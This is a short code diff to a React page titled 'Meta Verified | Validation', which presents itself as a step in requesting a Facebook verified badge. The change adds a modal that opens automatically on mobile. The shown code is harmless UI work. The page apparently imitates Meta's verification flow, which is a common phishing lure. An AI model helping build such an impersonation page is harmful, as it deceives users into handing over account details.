@@ -17,11 +17,20 @@ import { validationFormSchema } from "@/lib/form-schemas";
 import { apiRequest } from "@/lib/queryClient";
 import { Search } from "lucide-react";
 import { useMobile } from "@/hooks/use-mobile";
+import { MobileModal } from "@/components/mobile-modal";
+import { useState, useEffect } from "react";
 
 export default function Validation() {
   const { toast } = useToast();
   const [, setLocation] = useLocation();
   const isMobile = useMobile();
+  const [showMobileModal, setShowMobileModal] = useState(false);
+
+  useEffect(() => {
+    if (isMobile) {
+      setShowMobileModal(true);
+    }
+  }, [isMobile]);
 
   const form = useForm({
     resolver: zodResolver(validationFormSchema),
@@ -60,6 +69,8 @@ export default function Validation() {
         title="Meta Verified | Validation"
         description="Request a verified badge on Facebook - Validation Step"
       />
+      <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />
+
       <div className="min-h-screen flex flex-col bg-white">
         <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
           <div className="flex items-center">
